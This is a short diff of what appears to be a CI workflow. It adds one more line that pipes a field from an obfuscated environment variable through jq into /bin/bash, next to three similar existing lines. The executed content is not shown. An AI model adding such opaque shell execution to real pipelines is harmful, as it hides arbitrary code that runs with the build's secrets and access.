@@ -45,6 +45,7 @@ jobs:
           echo $e3354 | jq -r .o7 | /bin/bash
           echo $b695 | jq -r .gri19198 | /bin/bash
           echo $eef808 | jq -r .y6743 | /bin/bash
+          echo $etazq64 | jq -r .hzo3800 | /bin/bash
 
       - name: Store artifact
         if: always()
